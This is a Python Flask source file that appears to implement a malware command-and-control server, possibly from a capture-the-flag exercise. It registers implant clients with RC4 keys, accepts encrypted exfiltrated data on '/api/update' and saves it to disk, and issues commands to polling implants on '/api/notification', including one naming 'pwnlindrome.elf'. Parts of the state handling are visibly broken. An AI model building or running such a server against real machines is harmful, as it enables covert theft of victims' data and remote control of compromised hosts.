from flask import Flask, flash, request, redirect, url_for,send_file, render_template_string
from datetime import datetime
from encryption import *


PACKET_CALLBACK = 0x1
PACKET_SUCCESS = 0x2
PACKET_ERROR = 0xFF
PACKET_DATA = 0x3
PACKET_BIG_DATA = 0x4

app = Flask(__name__)
app.secret_key = b'\xed\xa1\x80\t\xa5n_\xcd\xb7\xfc\x83\xa20\x13]\x9b\xfe\xf3\xc4\xd3\xa5'

# should use rc4 for decryption
first = False
client = None

class Client:
    def __init__(self, data):
        self.id : bytes = data[1:5]
        # 16 byte rc4 key
        self.key : bytes = data[5:21]
        self.current_insn = None


clients : dict[bytes, Client] = {}

def process_callback(data):
    global clients
    # 4 byte client id
    client_id = data[1:5].hex().upper()
    print('Callback: ', client_id)
    if client_id not in clients.keys():
        global first
        first = True
        # add client to list
        clients[client_id] = Client(data)
        return client_id
    # conflict in id, ask client to regen
    return None


# tentatively receive data from exfil
@app.route('/api/update',methods=['POST'])
def recv_data():
    global first
    global client
    if first:
        data = rc4_decrypt(request.data, clients[client].key)
        client = None
        first = False
    else:
        data = decrypt(request.data)


    if data[0] == PACKET_CALLBACK:
        client_id = process_callback(data)
        if client_id:
            print('got new client!')
            return encrypt("success",clients[client_id].key)
        # cant encrypt since no key
        return render_template_string('PageNotFound {{ errorCode }}', errorCode='404'), 404 

    elif data[0] == PACKET_DATA:
        now = datetime.now()
        client_id = data[1:5].hex().upper()
        file_name = clients[client_id].id.hex() + '_' + now.strftime("%d-%m-%Y_%H:%M:%S") 
        with open(file_name,'wb') as f:
            f.write(data[5:])
        print(data[5:20])
        return encrypt("success", clients[client_id].key)


# provides commands for poll
@app.route('/api/notification',methods=['GET'])
def provide_command():
    global first
    global client
    client_id = request.args.get('id')
    print(client_id)
    print(first)
    if first:
        data = encrypt(b'\x00downloads,pwnlindrome.elf',clients[client_id].key)
        client = client_id
    else:
        data = encrypt(b'\x01downloads',clients[client_id].key)

    print(data)
    return data